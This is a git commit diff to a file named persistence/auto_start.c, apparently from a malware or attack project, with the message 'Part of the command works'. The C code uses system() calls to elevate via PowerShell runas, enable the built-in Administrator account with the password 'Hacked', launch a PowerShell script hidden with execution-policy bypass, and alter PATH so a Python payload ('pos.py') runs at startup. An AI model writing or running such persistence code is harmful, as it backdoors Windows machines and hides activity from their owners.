e736f03d9653d6198f2a8eb2621c0863759b3d57
STUPID-AF-CAT <geddy@waveville.net>
2020-02-04 13:31:37 -0600

    Part of the command works

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -12,7 +12,7 @@ and triggering add_startup.py so that pos.py runs on startup.
 
 int main()
 {
-    system("powershell Start-Process cmd -Verb \"runas\"\nnet user Administrator Hacked /active:yes");
+    system("powershell Start-Process cmd -Verb \"runas\"; net user Administrator Hacked /active:yes; exit");
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     system("setx path \"%PATH%;C:\\Python38\\\"");
     system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
